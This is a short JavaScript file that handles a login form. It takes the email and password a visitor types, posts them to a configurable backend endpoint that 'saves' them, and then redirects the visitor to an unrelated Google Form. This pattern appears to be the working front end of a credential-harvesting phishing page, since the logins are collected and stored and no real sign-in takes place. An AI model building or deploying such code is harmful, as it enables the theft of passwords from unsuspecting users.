// Change this to your backend URL (either local or Render)
const apiUrl = 'http://localhost:3000/save'; // Or 'https://your-app-name.onrender.com/save'

document.getElementById('loginForm').addEventListener('submit', async (e) => {
  e.preventDefault(); // Prevent default form submission

  const email = e.target.email.value;
  const password = e.target.password.value;

  if (!email || !password) {
    alert('Please enter both email and password');
    return;
  }

  try {
    const response = await fetch(apiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    });

    if (response.ok) {
      // If save was successful, redirect to Google Form
      window.location.href = 'https://docs.google.com/forms/d/e/1FAIpQLSfpvZehk-ws2UbDevpf_Wf33zwDELdtDsHT51JA8bBcuUFfwA/viewform?usp=dialog';
    } else {
      alert('Error saving credentials. Please try again.');
    }
  } catch (error) {
    alert('Failed to submit data: ' + error.message);
  }
});
